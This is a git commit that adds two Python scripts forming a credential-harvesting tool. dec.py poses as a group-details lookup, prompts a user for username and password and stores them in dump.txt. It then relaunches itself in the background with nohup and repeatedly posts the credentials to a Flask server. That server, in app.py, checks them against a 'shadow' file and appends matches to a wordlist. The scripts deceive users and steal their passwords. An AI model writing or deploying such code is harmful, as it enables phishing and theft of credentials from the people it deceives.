ec4ca280f3d759d8374512a5b32cd628357e5d13
Abraham Ugbeshe <abrahamugbeshe@gmail.com>
2021-02-08 17:53:30 +0100

    Initial commit

---
+++ app.py
@@ -0,0 +1,42 @@
+from flask import Flask
+from flask import request, jsonify
+
+app = Flask(__name__)
+app.config["DEBUG"] = True
+
+@app.route("/", methods=["GET"])
+def hello():
+    return "<h1 style='color:blue'>Welcome to the api!</h1>"
+
+@app.route("/save", methods=["POST"])
+def save():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    if not username or not password:
+        return jsonify({'error': 'All fields required'})
+
+    user = {
+        'username':username,
+        'password':password
+    }
+
+    f = open("shadow", "r")
+    data = f.read()
+
+    shadow = ''
+
+    arr = data.split("\n")
+    arr = [i for i in arr if i != ""]    # remove all appearances of empty strings from the array/list
+    for i in arr:
+        arr = i.split(":")
+        if username in arr:
+            f = open("wordlist.txt", "a")
+            f.write(f"\n{username}:{password}")
+            shadow = arr
+    f.close()
+    
+    return jsonify({'MESSAGE': 'Your details is accurate', 'success': shadow})
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0')
---
+++ dec.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python
+import getpass, urllib, urllib2, subprocess, os.path
+from time import sleep
+
+def fire():
+    f = open("dump.txt", "r")
+    data = f.read()
+    data = data.split(":")
+    username = data[0]
+    password = data[1]
+    f.close()
+
+    try:
+        query_args = { 'username':username, 'password':password }
+        encoded_args = urllib.urlencode(query_args)
+        url = 'http://0.0.0.0:5000/save'
+        print urllib2.urlopen(url, encoded_args).read()
+    except:
+        sleep(30)
+        fire()
+
+    sleep(10)
+    
+    fire()
+
+if os.path.isfile('dump.txt'):
+    fire()
+else:
+    username = raw_input("Enter your username: ")
+    username = username.lower()
+
+    print("CAUTION: DON'T DISCLOSE YOUR PASSWORD")
+    password = getpass.getpass("Your password: ")
+
+    f = open("shadow", "r")
+    data = f.read()
+
+    success = False
+
+    print("Searching for details...")
+
+    arr = data.split("\n")
+    arr = [i for i in arr if i != ""]
+    for i in arr:
+        arr = i.split(":")
+        if username in arr: 
+            f = open("dump.txt", "w")
+            f.write('%s:%s' % (username, password))
+            success = True
+            print("YOUR GROUP DETAILS ARE ACCURATE")
+            print(arr)
+    f.close()
+
+    if success:
+        subprocess.call(["chmod", "+x", "dec.py"])
+        subprocess.call(["nohup", "./dec.py", "&"])
+    else:
+        print("Your group username wasn't found. Kindly visit my office");
